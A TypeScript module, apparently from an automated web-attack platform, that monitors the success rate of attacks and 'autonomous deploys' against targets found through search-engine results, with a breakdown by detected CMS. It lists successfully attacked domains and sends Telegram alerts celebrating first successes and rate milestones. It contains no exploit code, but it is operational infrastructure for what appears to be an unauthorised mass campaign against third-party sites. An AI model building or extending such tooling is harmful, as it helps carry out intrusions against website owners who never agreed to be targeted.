/**
 * Success Rate Monitor — Real-time tracking + Telegram alerts
 *
 * Tracks attack success rate over time and sends Telegram notifications when:
 *   1. First successful attack ever (milestone!)
 *   2. Success rate crosses threshold (5%, 10%, 25%, 50%)
 *   3. Success rate drops significantly (>10% drop)
 *   4. Periodic daily summary
 *
 * Integrates with the Orchestrator Dashboard for real-time display.
 */
import { getDb } from "./db";
import {
  aiAttackHistory,
  autonomousDeploys,
  serpDiscoveredTargets,
  strategyOutcomeLogs,
} from "../drizzle/schema";
import { eq, and, sql, gte, count, desc } from "drizzle-orm";
import { sendTelegramNotification } from "./telegram-notifier";

// ═══════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════

export interface SuccessRateSnapshot {
  timestamp: number;
  totalAttacks: number;
  successfulAttacks: number;
  failedAttacks: number;
  successRate: number; // 0-100
  totalDeploys: number;
  successfulDeploys: number;
  deploySuccessRate: number; // 0-100
  targetsDiscovered: number;
  targetsWithCms: number;
  cmsBreakdown: Record<string, number>;
  topSuccessfulDomains: string[];
  recentTrend: "improving" | "declining" | "stable" | "no_data";
}

export interface SuccessRateHistory {
  snapshots: SuccessRateSnapshot[];
  milestones: Milestone[];
  alertsSent: number;
}

interface Milestone {
  type: "first_success" | "rate_threshold" | "rate_drop" | "daily_summary";
  value: number;
  timestamp: number;
  message: string;
}

// ═══════════════════════════════════════════════
//  STATE
// ═══════════════════════════════════════════════

const history: SuccessRateHistory = {
  snapshots: [],
  milestones: [],
  alertsSent: 0,
};

const THRESHOLDS_NOTIFIED = new Set<number>();
let lastDailySummary = 0;
let monitorInterval: ReturnType<typeof setInterval> | null = null;

// ═══ DEDUP: Prevent duplicate notifications ═══
let firstSuccessNotified = false; // persists across snapshots within same process
const recentNotificationHashes = new Map<string, number>(); // hash → timestamp
const DEDUP_WINDOW_MS = 10 * 60 * 1000; // 10 minutes dedup window

function getNotificationHash(type: string, key: string): string {
  return `${type}:${key}`;
}

function isDuplicate(type: string, key: string): boolean {
  const hash = getNotificationHash(type, key);
  const lastSent = recentNotificationHashes.get(hash);
  if (lastSent && Date.now() - lastSent < DEDUP_WINDOW_MS) {
    return true;
  }
  recentNotificationHashes.set(hash, Date.now());
  // Clean old entries
  const now = Date.now();
  Array.from(recentNotificationHashes.entries()).forEach(([h, ts]) => {
    if (now - ts > DEDUP_WINDOW_MS) recentNotificationHashes.delete(h);
  });
  return false;
}

// ═══════════════════════════════════════════════
//  CORE: Collect Snapshot
// ═══════════════════════════════════════════════

export async function collectSnapshot(): Promise<SuccessRateSnapshot> {
  const db = await getDb();
  if (!db) {
    return {
      timestamp: Date.now(),
      totalAttacks: 0,
      successfulAttacks: 0,
      failedAttacks: 0,
      successRate: 0,
      totalDeploys: 0,
      successfulDeploys: 0,
      deploySuccessRate: 0,
      targetsDiscovered: 0,
      targetsWithCms: 0,
      cmsBreakdown: {},
      topSuccessfulDomains: [],
      recentTrend: "no_data",
    };
  }

  // Attack history stats
  const [attackStats] = await db.select({
    total: count(),
    successful: sql<number>`SUM(CASE WHEN ${aiAttackHistory.success} = true THEN 1 ELSE 0 END)`,
    failed: sql<number>`SUM(CASE WHEN ${aiAttackHistory.success} = false THEN 1 ELSE 0 END)`,
  }).from(aiAttackHistory);

  // Deploy stats
  const [deployStats] = await db.select({
    total: count(),
    successful: sql<number>`SUM(CASE WHEN ${autonomousDeploys.status} = 'success' THEN 1 ELSE 0 END)`,
  }).from(autonomousDeploys);

  // Target discovery stats
  const [targetStats] = await db.select({
    total: count(),
    withCms: sql<number>`SUM(CASE WHEN ${serpDiscoveredTargets.cms} IS NOT NULL AND ${serpDiscoveredTargets.cms} != 'unknown' THEN 1 ELSE 0 END)`,
  }).from(serpDiscoveredTargets);

  // CMS breakdown
  const cmsRows = await db.select({
    cms: serpDiscoveredTargets.cms,
    cnt: count(),
  }).from(serpDiscoveredTargets)
    .where(sql`${serpDiscoveredTargets.cms} IS NOT NULL AND ${serpDiscoveredTargets.cms} != 'unknown'`)
    .groupBy(serpDiscoveredTargets.cms);

  const cmsBreakdown: Record<string, number> = {};
  for (const row of cmsRows) {
    if (row.cms) cmsBreakdown[row.cms] = Number(row.cnt);
  }

  // Top successful domains
  const successDomains = await db.select({
    domain: aiAttackHistory.targetDomain,
    cnt: count(),
  }).from(aiAttackHistory)
    .where(eq(aiAttackHistory.success, true))
    .groupBy(aiAttackHistory.targetDomain)
    .orderBy(desc(count()))
    .limit(5);

  const totalAttacks = Number(attackStats?.total || 0);
  const successfulAttacks = Number(attackStats?.successful || 0);
  const failedAttacks = Number(attackStats?.failed || 0);
  const totalDeploys = Number(deployStats?.total || 0);
  const successfulDeploys = Number(deployStats?.successful || 0);

  // Calculate trend from last 3 snapshots
  let recentTrend: "improving" | "declining" | "stable" | "no_data" = "no_data";
  if (history.snapshots.length >= 2) {
    const recent = history.snapshots.slice(-3);
    const rates = recent.map(s => s.successRate);
    const avgChange = rates.length >= 2
      ? (rates[rates.length - 1] - rates[0]) / rates.length
      : 0;
    if (avgChange > 1) recentTrend = "improving";
    else if (avgChange < -1) recentTrend = "declining";
    else recentTrend = "stable";
  }

  return {
    timestamp: Date.now(),
    totalAttacks,
    successfulAttacks,
    failedAttacks,
    successRate: totalAttacks > 0 ? (successfulAttacks / totalAttacks) * 100 : 0,
    totalDeploys,
    successfulDeploys,
    deploySuccessRate: totalDeploys > 0 ? (successfulDeploys / totalDeploys) * 100 : 0,
    targetsDiscovered: Number(targetStats?.total || 0),
    targetsWithCms: Number(targetStats?.withCms || 0),
    cmsBreakdown,
    topSuccessfulDomains: successDomains.map(d => d.domain),
    recentTrend,
  };
}

// ═══════════════════════════════════════════════
//  ALERTS: Check thresholds and send Telegram
// ═══════════════════════════════════════════════

async function checkAndAlert(snapshot: SuccessRateSnapshot) {
  const prevSnapshot = history.snapshots.length > 0
    ? history.snapshots[history.snapshots.length - 1]
    : null;

  // 1. First successful attack ever! (only send ONCE per process lifetime)
  if (snapshot.successfulAttacks > 0 && !firstSuccessNotified && (!prevSnapshot || prevSnapshot.successfulAttacks === 0)) {
    firstSuccessNotified = true; // Mark as notified — never send again
    
    if (!isDuplicate("first_success", "global")) {
      const msg = [
        "🎉 FIRST SUCCESSFUL ATTACK!",
        "",
        `✅ Success Rate: ${snapshot.successRate.toFixed(1)}%`,
        `🎯 Total Attacks: ${snapshot.totalAttacks}`,
        `✅ Successful: ${snapshot.successfulAttacks}`,
        `❌ Failed: ${snapshot.failedAttacks}`,
        "",
        `🏆 Domains: ${snapshot.topSuccessfulDomains.join(", ") || "N/A"}`,
        "",
        `🕐 ${new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" })}`,
      ].join("\n");

      await sendTelegramNotification({
        type: "success",
        targetUrl: "success-rate-monitor",
        details: msg,
      });

      history.milestones.push({
        type: "first_success",
        value: snapshot.successRate,
        timestamp: Date.now(),
        message: "First successful attack achieved!",
      });
      history.alertsSent++;
    }
  } else if (snapshot.successfulAttacks > 0) {
    // Already had successes before — mark as notified to prevent future spam
    firstSuccessNotified = true;
  }

  // 2. Success rate crosses threshold
  const thresholds = [5, 10, 25, 50, 75];
  for (const threshold of thresholds) {
    if (snapshot.successRate >= threshold && !THRESHOLDS_NOTIFIED.has(threshold)) {
      THRESHOLDS_NOTIFIED.add(threshold);

      if (!isDuplicate("threshold", String(threshold))) {
        const msg = [
          `📈 SUCCESS RATE MILESTONE: ${threshold}%`,
          "",
          `✅ Current Rate: ${snapshot.successRate.toFixed(1)}%`,
          `🎯 Total: ${snapshot.totalAttacks} attacks`,
          `✅ Successful: ${snapshot.successfulAttacks}`,
          `📊 Deploys: ${snapshot.totalDeploys} (${snapshot.deploySuccessRate.toFixed(1)}% success)`,
          `🔍 Targets: ${snapshot.targetsDiscovered} discovered, ${snapshot.targetsWithCms} with CMS`,
          "",
          `📊 CMS: ${Object.entries(snapshot.cmsBreakdown).map(([k, v]) => `${k}: ${v}`).join(", ") || "none detected"}`,
          `📈 Trend: ${snapshot.recentTrend}`,
          "",
          `🕐 ${new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" })}`,
        ].join("\n");

        await sendTelegramNotification({
          type: "success",
          targetUrl: "success-rate-monitor",
          details: msg,
        });

        history.milestones.push({
          type: "rate_threshold",
          value: threshold,
          timestamp: Date.now(),
          message: `Success rate crossed ${threshold}%`,
        });
        history.alertsSent++;
      }
    }
  }

  // 3. Significant rate drop (>10% from previous)
  if (prevSnapshot && prevSnapshot.successRate > 0) {
    const drop = prevSnapshot.successRate - snapshot.successRate;
    if (drop > 10) {
      const msg = [
        `📉 SUCCESS RATE DROP ALERT`,
        "",
        `⚠️ Rate dropped from ${prevSnapshot.successRate.toFixed(1)}% → ${snapshot.successRate.toFixed(1)}%`,
        `📉 Drop: -${drop.toFixed(1)}%`,
        `🎯 Total: ${snapshot.totalAttacks} attacks`,
        "",
        `🕐 ${new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" })}`,
      ].join("\n");

      await sendTelegramNotification({
        type: "failure",
        targetUrl: "success-rate-monitor",
        details: msg,
      });

      history.milestones.push({
        type: "rate_drop",
        value: drop,
        timestamp: Date.now(),
        message: `Success rate dropped by ${drop.toFixed(1)}%`,
      });
      history.alertsSent++;
    }
  }

  // 4. Daily summary (every 24 hours)
  const now = Date.now();
  if (now - lastDailySummary > 24 * 60 * 60 * 1000) {
    lastDailySummary = now;

    // Calculate 24h stats
    const last24h = history.snapshots.filter(s => s.timestamp > now - 24 * 60 * 60 * 1000);
    const rateChange = last24h.length >= 2
      ? last24h[last24h.length - 1].successRate - last24h[0].successRate
      : 0;

    const msg = [
      `📊 DAILY SUCCESS RATE SUMMARY`,
      "",
      `✅ Current Rate: ${snapshot.successRate.toFixed(1)}%`,
      `${rateChange >= 0 ? "📈" : "📉"} 24h Change: ${rateChange >= 0 ? "+" : ""}${rateChange.toFixed(1)}%`,
      "",
      `🎯 Total Attacks: ${snapshot.totalAttacks}`,
      `✅ Successful: ${snapshot.successfulAttacks}`,
      `❌ Failed: ${snapshot.failedAttacks}`,
      "",
      `📦 Deploys: ${snapshot.totalDeploys} (${snapshot.deploySuccessRate.toFixed(1)}% success)`,
      `🔍 Targets: ${snapshot.targetsDiscovered} discovered, ${snapshot.targetsWithCms} CMS detected`,
      `📊 CMS: ${Object.entries(snapshot.cmsBreakdown).map(([k, v]) => `${k}: ${v}`).join(", ") || "none"}`,
      "",
      `📈 Trend: ${snapshot.recentTrend}`,
      `🏆 Top domains: ${snapshot.topSuccessfulDomains.join(", ") || "none yet"}`,
      "",
      `🕐 ${new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" })}`,
    ].join("\n");

    await sendTelegramNotification({
      type: "info",
      targetUrl: "success-rate-monitor",
      details: msg,
    });

    history.milestones.push({
      type: "daily_summary",
      value: snapshot.successRate,
      timestamp: now,
      message: `Daily summary: ${snapshot.successRate.toFixed(1)}% success rate`,
    });
    history.alertsSent++;
  }
}

// ═══════════════════════════════════════════════
//  MONITOR LIFECYCLE
// ═══════════════════════════════════════════════

/**
 * Initialize state from DB to prevent duplicate notifications after restart
 */
async function initializeFromDb(): Promise<void> {
  try {
    const db = await getDb();
    if (!db) return;
    
    // Check if we already have successful attacks in DB
    const [stats] = await db.select({
      successful: sql<number>`SUM(CASE WHEN ${aiAttackHistory.success} = true THEN 1 ELSE 0 END)`,
    }).from(aiAttackHistory);
    
    const successCount = Number(stats?.successful || 0);
    if (successCount > 0) {
      firstSuccessNotified = true; // Already had successes before this process
      console.log(`[SuccessRateMonitor] DB shows ${successCount} prior successes — skipping first_success notification`);
    }
    
    // Pre-populate threshold notifications based on current rate
    const [totalStats] = await db.select({
      total: count(),
      successful: sql<number>`SUM(CASE WHEN ${aiAttackHistory.success} = true THEN 1 ELSE 0 END)`,
    }).from(aiAttackHistory);
    
    const total = Number(totalStats?.total || 0);
    const successful = Number(totalStats?.successful || 0);
    const currentRate = total > 0 ? (successful / total) * 100 : 0;
    
    // Mark thresholds already crossed
    const thresholds = [5, 10, 25, 50, 75];
    for (const t of thresholds) {
      if (currentRate >= t) {
        THRESHOLDS_NOTIFIED.add(t);
      }
    }
    if (THRESHOLDS_NOTIFIED.size > 0) {
      console.log(`[SuccessRateMonitor] Pre-marked thresholds: ${Array.from(THRESHOLDS_NOTIFIED).join(', ')}%`);
    }
  } catch (err: any) {
    console.error("[SuccessRateMonitor] initializeFromDb error:", err.message);
  }
}

/**
 * Start the success rate monitor — collects snapshots every 30 minutes
 */
export function startSuccessRateMonitor() {
  if (monitorInterval) {
    console.log("[SuccessRateMonitor] Already running");
    return;
  }

  console.log("[SuccessRateMonitor] Starting — collecting snapshots every 30 minutes");

  // On startup: check DB to see if we already have successes — prevent re-sending "first success"
  initializeFromDb().then(() => {
    collectAndStore().catch(err => console.error("[SuccessRateMonitor] Initial collection failed:", err));
  }).catch((err: any) => {
    console.error("[SuccessRateMonitor] DB init failed, collecting anyway:", err.message);
    collectAndStore().catch(err2 => console.error("[SuccessRateMonitor] Initial collection failed:", err2));
  });

  // Schedule periodic collection (every 30 minutes)
  monitorInterval = setInterval(async () => {
    try {
      await collectAndStore();
    } catch (err: any) {
      console.error("[SuccessRateMonitor] Collection failed:", err.message);
    }
  }, 30 * 60 * 1000);
}

/**
 * Stop the monitor
 */
export function stopSuccessRateMonitor() {
  if (monitorInterval) {
    clearInterval(monitorInterval);
    monitorInterval = null;
    console.log("[SuccessRateMonitor] Stopped");
  }
}

/**
 * Collect snapshot, check alerts, and store
 */
async function collectAndStore() {
  const snapshot = await collectSnapshot();
  await checkAndAlert(snapshot);

  // Keep last 48 snapshots (24 hours at 30-min intervals)
  history.snapshots.push(snapshot);
  if (history.snapshots.length > 48) {
    history.snapshots = history.snapshots.slice(-48);
  }

  console.log(`[SuccessRateMonitor] Snapshot: ${snapshot.successRate.toFixed(1)}% success (${snapshot.totalAttacks} attacks, ${snapshot.targetsDiscovered} targets, ${snapshot.targetsWithCms} CMS)`);
}

/**
 * Get current success rate data for the dashboard
 */
export function getSuccessRateData(): SuccessRateHistory & { current: SuccessRateSnapshot | null } {
  return {
    ...history,
    current: history.snapshots.length > 0 ? history.snapshots[history.snapshots.length - 1] : null,
  };
}

/**
 * Force collect a fresh snapshot (for manual refresh)
 */
export async function forceRefresh(): Promise<SuccessRateSnapshot> {
  const snapshot = await collectSnapshot();
  await checkAndAlert(snapshot);
  history.snapshots.push(snapshot);
  if (history.snapshots.length > 48) {
    history.snapshots = history.snapshots.slice(-48);
  }
  return snapshot;
}
